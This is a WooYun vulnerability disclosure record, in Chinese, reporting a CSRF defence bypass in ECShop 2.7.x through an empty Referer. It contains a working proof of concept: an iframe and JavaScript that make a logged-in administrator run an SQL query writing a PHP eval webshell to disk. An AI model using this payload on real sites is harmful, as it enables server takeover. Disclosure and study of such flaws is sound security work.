{"id": 51042, "wybug_id": "wooyun-2014-075931", "wybug_title": "ecshop csrf防御绕过后台敏感功能csrf getshell", "wybug_corp": "ShopEx", "wybug_author": "路人甲", "wybug_date": "2014-09-19 15:50", "wybug_open_date": "2014-12-18 15:52", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向公众公开  简要描述： csrf防御绕过。 详细说明：  可以csrf执行后台各种敏感功能。这里分析的是利用空referer的方式绕过。参考http://zone.wooyun.org/content/744利用这个绕过可以实现ecshop各个版本的csrf getshell，csrf dump数据库。测试了2.7.3一个版本和最新的2.7.4本文可以看做该帖子的http://zone.wooyun.org/content/744的一个实例测试。感谢大神们分享技术.exp1,csrf getshell 利用执行sql的接口，结合报路径漏洞。新建html文件内容为：<iframe src=\"javascript:'<script src=http://127.0.0.1/ecshop2.7.4/csrf.js></script>'\"></iframe>新建 http://127.0.0.1/ecshop2.7.4/csrf.js js文件。内容为：\nvar url=\"http://127.0.0.1/ecshop2.7.4/admin/sql.php\";var sendata = \"sql=select+%22%3C%3Fphp+%40eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22+into+outfile+%27C%物理路径Ctestcsrf.php%27%3B&act=query\";if (window.XMLHttpRequest){var xmlhttp1=new XMLHttpRequest();}else{var xmlhttp1=new ActiveXObject(\"Microsoft.XMLHTTP\");}xmlhttp1.open(\"POST\",url,true);xmlhttp1.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");xmlhttp1.send(sendata);\n管理员访问链接即可生成testcsrf.php的文件。\n\n\n\n这里仅仅使用这个接口做一个案例，后台大量的接口，敏感操作都暴漏在csrf的威胁之下了。   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-09-20 09:00 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}